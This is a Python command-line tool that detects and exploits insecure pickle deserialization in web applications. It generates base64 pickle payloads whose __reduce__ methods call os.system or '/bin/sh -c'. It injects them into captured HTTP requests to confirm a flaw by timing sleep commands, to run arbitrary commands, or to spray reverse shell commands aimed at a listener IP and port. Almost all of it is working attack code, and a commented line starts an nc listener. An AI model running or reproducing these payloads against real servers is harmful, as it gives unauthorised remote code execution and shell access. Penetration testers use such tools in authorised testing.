#!/usr/bin/env python3

import argparse
import base64
import os
import pickle
import pickletools
import time
import sys
import math
import signal
import subprocess

import requests
from requests import Request
requests.packages.urllib3.disable_warnings()

import utils

g_args = None

def parse_args():

    # create parent parser
    # parses arguments that can be used with every of the four basic functionalities
    parent_parser = argparse.ArgumentParser(description=' [+] Tool for identification and exploitation of insecure deserialization vulnerabilities in python')

    # each of the four basic functionalities uses its own subparser to manage arguments
    subparsers = parent_parser.add_subparsers(dest='subparser_name')

    # create the parser for the verify-pickle functionality
    verify_parser = subparsers.add_parser('verify-pickle', help="Verify that the string is base64 serialized python pickle object")
    verify_parser.add_argument('--object', required=False, help="Object to verify(base64)") # todo: raw?
    verify_parser.add_argument('--unsafe', required=False, action='store_true',
                               help='Use dangerous deserialization functions to verify if the string is serialized object.'
                                     'Dangerous! Should only be used when sure the provided object is safe to deserialize.')

    # create the parser for the generate-payload functionality
    generate_payload_parser = subparsers.add_parser('generate-payload', help="Generate serialized object with custom code")
    generate_payload_parser.add_argument('--cmd', required=False, help='Generate the payload which executes provided command when unpickled')
    generate_payload_parser.add_argument("--lib", required=False, help="Use tool for specific serialization library: [picle, pyyaml]", choices=['pickle', 'pyyaml'])
    generate_payload_parser.add_argument('--object', required=False, help="Create payload by appending desired code to the already existing pickle object")
    generate_payload_parser.add_argument('--raw', action='store_true', required=False, help="Include raw bytes representation of payloads.")

    # create the parser for the confirm-vuln functionality
    confirm_vuln_parser = subparsers.add_parser('confirm-vuln', help="Test to confirm existence of vulnerability")
    confirm_vuln_parser.add_argument('-r', '--request', required=True, help="Path to a file containing HTTP request in format used in Burp")
    confirm_vuln_parser.add_argument('-p', '--proxy', required=False, help="Use HTTP/HTTPS proxy when issuing request to confirm vulnerability")
    confirm_vuln_parser.add_argument("-m", "--marker", required=False, help="Custom marker for injection point in request file. By default the marker is '*'")
    confirm_vuln_parser.add_argument("--lib", required=False, help="Use tool for specific serialization library: [picle, pyyaml]", choices=['pickle', 'pyyaml'])
    confirm_vuln_parser.add_argument("--http", required=False, action='store_true', help="Send requests over http.")

    # create the parser for the exploit functionality
    exploit_parser = subparsers.add_parser('exploit', help="Try to exploit the vulnerability and execute custom command.")
    exploit_parser.add_argument('-r', '--request', required=True, help="Path to a file containing HTTP request in format used in Burp")
    exploit_parser.add_argument('-p', '--proxy', required=False, help="Use HTTP/HTTPS proxy when issuing request to exploit vulnerability")
    exploit_parser.add_argument("-m", "--marker", required=False, help="Custom marker for injection point in request file. By default the marker is '*'")
    exploit_parser.add_argument("--lib", required=False, help="Use tool for specific serialization library: [picle, pyyaml]", choices=['pickle', 'pyyaml'])
    exploit_parser.add_argument("--http", required=False, action='store_true', help="Send requests over http.")
    exploit_parser.add_argument("--revshell", required=False, action='store_true', help="Try a bunch of reverse shell payloads")
    exploit_parser.add_argument('--cmd', required=False, help='Provide command you want to execute')

    # parse the arguments
    parsed_args = parent_parser.parse_args()
    global g_args
    g_args = parsed_args

    if parsed_args.subparser_name == 'verify-pickle':
        verify()
    elif parsed_args.subparser_name == 'generate-payload':
        generate_payload()
    elif parsed_args.subparser_name == 'confirm-vuln':
        confirm_vuln()
    elif parsed_args.subparser_name == 'exploit':
        exploit()
    else:
        parent_parser.print_usage()
        print()
        exit(1)


def verify() -> bool:
    print("[+] Using verify module\n")

    if g_args.object:
        base64_encoded_object = str(g_args.object)
    else:
        base64_encoded_object = str(input("[+] Enter your base64 encoded pickle: "))

    pickle_object = None
    try:
        pickle_object = base64.b64decode(base64_encoded_object)
    except Exception:
        print_warning("[-] Not valid base64.")
        print()
        return False

    confidence = None

    # try to detect base64 encoded pickle object without unpickling
    if not g_args.unsafe:

        # first try to detect only STOP opcode to detect potential pickle object,
        # if the object does not end with STOP opcode no need to test further, object is not a valid pickle
        if pickle_object.endswith(pickle.STOP):
            confidence = "[+] Confidence: Low. Might be pickle object. Ends with pickle STOP opcode"
        else:
            print_warning("[-] Not a valid pickle object")
            print()
            return False

        # try to verify if provided object is pickle by disassembling it
        # and verifying that it consists only of valid pickle opcodes
        contains_only_pickle_opcodes = True
        try:
            for obj in pickletools.genops(pickle_object):
                opcode_str = obj[0].code
                if not (bytes(opcode_str, 'utf-8')) in [bytes(opcode.code, 'utf-8') for opcode in pickletools.opcodes]:
                    contains_only_pickle_opcodes = False

            if contains_only_pickle_opcodes:
                print_info("[+] Pickle object detected", greentext=True)
                confidence = "[+] Confidence: High"
        except Exception:
            print_warning("[-] Not a valid pickle object")
            print()
            return False

    # try to deserialize object to verify
    # unsafe!!!
    else:
        print("[+] using --unsafe")
        try:
            pickle.loads(pickle_object)
            print_info("[+] Pickle object detected", greentext=True)
            confidence = "[+] Confidence: Certain"
        except Exception:
            print_warning("[-] Not a valid pickle object")
            print()
            return False

    print_info(confidence)
    print()
    return True


# relying on os module
class os_rce_payload():
    def __init__(self, command):
        self.command = command
    def __reduce__(self):
        import os
        return os.system, (self.command,)
    

# relying on subprocess module
class subprocess_rce_payload():
    def __init__(self, command):
         self.command = str(command)
    def __reduce__(self):
           import subprocess
           return (subprocess.check_output, (('/bin/sh','-c', self.command), 0))
    


# execute python sleep
# used in confirm-vuln module
class pysleep_payload():
    def __init__(self, amount):
         self.amount = int(amount)
    def __reduce__(self):
           import time
           return (time.sleep, (self.amount,))


        

def generate_payload() -> list[str]: # todo: nadodati na postojeci pickle objekt

    print("[+] Using generate-payload module")

    cmd = None
    
    if g_args.cmd:
        cmd = g_args.cmd
    else:
        cmd = input("[+] Enter your command: ")
   

    print("[+] Generating payloads ... \n")
    payloads_list = []

    print_info("[+] Payloads relying on os module: ")
    print(f"  [+] Pickle protocols 0-{pickle.HIGHEST_PROTOCOL}")
    for prot_num in range (pickle.HIGHEST_PROTOCOL + 1):
        payload = pickle.dumps(os_rce_payload(cmd), protocol=prot_num)
        print(f"\t[+] Base64 encoded payload num #{prot_num}: ", base64.b64encode(payload).decode("utf-8"))
        if g_args.raw:
            print("\t[+] Raw bytes payload: ", payload)
            print()
        payloads_list.append(base64.b64encode(payload).decode("utf-8"))


    print()
    print_info("[+] Payloads relying on subprocess module: ")
    print(f"  [+] Pickle protocols 0-{pickle.HIGHEST_PROTOCOL}")
    for prot_num in range (pickle.HIGHEST_PROTOCOL + 1):
        payload = pickle.dumps(subprocess_rce_payload(cmd), protocol=prot_num)
        print(f"\t[+] Base64 encoded payload num #{prot_num}: ", base64.b64encode(payload).decode("utf-8"))
        if g_args.raw:
            print("\t[+] Raw bytes payload: ", payload)
            print()
        payloads_list.append(base64.b64encode(payload).decode("utf-8"))
    
    print()

    return payloads_list



# no output just return payloads, called from confirm-vuln/exploit
def generate_payload_silent(cmd) -> list[str]:
        
    payloads_list = []
    for prot_num in range (pickle.HIGHEST_PROTOCOL + 1):
        payload_os = base64.b64encode(pickle.dumps(os_rce_payload(cmd), protocol=prot_num)).decode("utf-8")
        payload_subproc = base64.b64encode(pickle.dumps(subprocess_rce_payload(cmd), protocol=prot_num)).decode("utf-8")
        payloads_list.append(payload_os)
        payloads_list.append(payload_subproc)

    return payloads_list



def read_file(path: str) -> list[str]:
    try:
        req_file = open(path, 'r')
        print("[+] Using request file: ", path)
    except Exception as e:
        print_red("[+] Error opening file: ", path)  # print_red
        exit(1)

    lines = req_file.readlines()
    req_file.close()
    return lines


# set payload to None if you only want to parse the request
def parse_request_and_insert_payload(req_lines, payload=None, custom_marker=None, http=False):
    method = None
    url = None
    host = None
    headers = dict()
    data = None
    lines = req_lines[:]

    if payload is not None:
        if custom_marker is None:
            lines = [l.replace('inject_here', payload) for l in req_lines]
        else:
            lines = [l.replace(custom_marker, payload) for l in req_lines]

    first_line = lines.pop(0)
    method = first_line.split()[0].strip()
    uri = first_line.split()[1].strip()

    for idx, line in enumerate(lines):
        if line.startswith('\n'):
            data = "".join(lines[idx + 1:])
            break
        else:
            # split only by first occurance to save the port(e.g Host: 127.0.0.1:1337)
            header_name = line.split(':', 1)[0].strip()
            header_value = line.split(':', 1)[1].strip()
            headers.update({header_name: header_value})
            if line.startswith("Host:"):
                host = header_value

    if host is None:
        print("[+] No Host header detected in request")
        exit(1)
    
    # assumes https by default
    if http:
        url = "http://" + host + uri
    else:
        url = "https://" + host + uri

    return method, url, headers, data


# measure average round trip time
# 5 request sample
def measure_avg_rtt(req_lines, http):

        (method, url, headers, data) = parse_request_and_insert_payload(req_lines=req_lines, payload=None, custom_marker=None, http=g_args.http)
        req = Request(method=method, url=url, headers=headers, data=data)
        prepared_req = req.prepare()

        total_rtt = 0
        num_reqs = 5

        for k in range(num_reqs):
            try:
                response = requests.Session().send(prepared_req, verify=False)
            except requests.exceptions.SSLError:
                print_warning("[+] SSL error. Use --http flag?")
                print()
                exit(1)
    
            total_rtt += response.elapsed.total_seconds()

        average_rtt = total_rtt/num_reqs 
        print(f"[+] Average RTT is: {round(average_rtt, 5)} seconds.")
        return average_rtt


def confirm_vuln():
    print("[+] Using confirm-vuln module")

    request = read_file(g_args.request)

    proxy_servers = None
    if g_args.proxy is not None:
        proxy_servers = {
            'http': g_args.proxy,
            'https': g_args.proxy,
        }


    avg_rtt = measure_avg_rtt(req_lines=request, http=g_args.http)


    if avg_rtt > 5:
        sleep_time = int(math.ceil(2*avg_rtt))
    else:
        sleep_time = 5


    # list of payloads(different pickle protocols, different modules for rce/executing sleep)
    #todo: test with some prepickled sleep/timeout payloads
    payloads_list = []
    payloads_list.append(base64.b64encode(pickle.dumps(pysleep_payload(sleep_time))).decode("utf-8"))
    payloads_list.append(base64.b64encode(pickle.dumps(pysleep_payload(sleep_time+1))).decode("utf-8"))
    payloads_list.append(base64.b64encode(pickle.dumps(pysleep_payload(sleep_time+2))).decode("utf-8"))
    payloads_list.extend(generate_payload_silent(f"sleep {sleep_time}"))
    


    print("[+] Testing ...")
    for payload in payloads_list:
        (method, url, headers, data) = parse_request_and_insert_payload(req_lines=request, payload=payload, custom_marker=g_args.marker, http=g_args.http)
        req = Request(method=method, url=url, headers=headers, data=data)
        prepared_req = req.prepare()

        try:
            if proxy_servers is not None:
                response = requests.Session().send(prepared_req, proxies=proxy_servers, verify=False)
            else:
                response = requests.Session().send(prepared_req, verify=False)
        except requests.exceptions.SSLError:
            print_warning("[+] SSL error. Use --http flag?")
            print()
            exit(1)

        if response.elapsed.total_seconds() > sleep_time:
           # double check
            if proxy_servers is not None:
                response2 = requests.Session().send(prepared_req, proxies=proxy_servers, verify=False)
            else:
                response2 = requests.Session().send(prepared_req, verify=False)
            
            if response2.elapsed.total_seconds() > sleep_time:
                print()
                print_green("\n[+] Tested web application is vulnerable!!!") 
                print_info(f"[+] Payload causing sleep {sleep_time}: {payload}")
                print()
                return

    print_info("[+] The app seems to not be vulnerable")
    print()

    




def exploit():
    print("[+] Using exploit module")

    request = read_file(g_args.request)

    proxy_servers = None
    if g_args.proxy is not None:
        proxy_servers = {
            'http': g_args.proxy,
            'https': g_args.proxy,
        }


    # spray and pray a bunch of revshells
    if g_args.revshell:
        print("\n[+] Trying reverse shell payloads:")
        revshell_ip = input("[+] Enter listener ip (LHOST): ")
        revshell_port = input("[+] Enter listener port (LPORT): ")

        #todo
        # user_input = input(f"[+] Start a local netcat listener on port {revshell_port}? (y/N)")
        # if user_input.lower() == "y":
        #     print_info(f"[+] Starting listener on {revshell_ip}:{revshell_port}")
        #     # start a listener in separeate thread 
        #     os.system(f"nc -lvnp  {revshell_port}")


        print("[+] Trying out reverse shell payloads ...")
        for rs_index, rs_cmd in enumerate(utils.reverse_shells):
            rs_cmd = rs_cmd.replace("ip_placeholder", revshell_ip).replace("port_placeholder", revshell_port).strip()
            payloads_list = generate_payload_silent(rs_cmd)
            
            for num, payload in enumerate(payloads_list):
                (method, url, headers, data) = parse_request_and_insert_payload(req_lines=request, payload=payload, custom_marker=g_args.marker, http=g_args.http)
                req = Request(method=method, url=url, headers=headers, data=data)
                prepared_req = req.prepare()

                try:
                    if proxy_servers is not None:
                        response = requests.Session().send(prepared_req, proxies=proxy_servers, verify=False)
                    else:
                        response = requests.Session().send(prepared_req, verify=False)
                except requests.exceptions.SSLError:
                    print_red("[+] SSL error. Use --http flag?")
                    exit(1)
            print(f"[+] Tried reverse shell num #{rs_index}")
        

        print_green("\n[+] Done\n")
        return
    

    # execute single command
    else:
        if g_args.cmd:
            cmd = g_args.cmd
        else:
            cmd = input("[+] Enter your command: ")
        
        payloads_list = generate_payload_silent(cmd)

        print(f"[+] Sending requests with payload executingl: {cmd}")
        for num, payload in enumerate(payloads_list):
            (method, url, headers, data) = parse_request_and_insert_payload(req_lines=request, payload=payload, custom_marker=g_args.marker, http=g_args.http)
            req = Request(method=method, url=url, headers=headers, data=data)
            prepared_req = req.prepare()
            try:
                if proxy_servers is not None:
                    response = requests.Session().send(prepared_req, proxies=proxy_servers, verify=False)
                else:
                    response = requests.Session().send(prepared_req, verify=False)
            except requests.exceptions.SSLError:
                    print_red("[+] SSL error. Use --http flag?")
                    exit(1)
            
            print(f"\t[+] Sent request num #{num + 1} ")

        
        print()
        print_info("[+] Done\n")


    
def sig_handler(sig, frame):
    print()
    print_warning("[+] Caught Ctrl-c. Exiting...\n")
    exit(1)


def check_py_version():
    if sys.version_info < (3, 8):
        print()
        print_warning("[+] Python version 3.8 or newer is required")
        print_warning("[+] Quitting")
        print()
        exit(1)


def print_banner():
    print(utils.banner)


class colors:
    GREEN = '\033[92m'
    RED = '\033[91m'
    END = '\033[0m'
    BOLD = '\033[1m'



def print_info(text, greentext=False):
     if greentext == False:
          print(f"{colors.BOLD}[{colors.GREEN} INFO {colors.END}] {colors.BOLD}{text}{colors.END}")
     else:
          print(f"{colors.BOLD}[{colors.GREEN} INFO {colors.END}] {colors.BOLD}{colors.GREEN}{text}{colors.END}")


def print_warning(text):
    print(f"{colors.BOLD}[{colors.RED} WARNING {colors.END}]{colors.BOLD}{text}{colors.END}")


def print_green(txt):
    print(f"{colors.GREEN}{txt}{colors.END}")


def print_red(txt):
    print(f"{colors.RED}{txt}{colors.END}")


if __name__ == '__main__':

    signal.signal(signal.SIGINT, sig_handler)
    print_banner()
    check_py_version()
    parse_args()
    



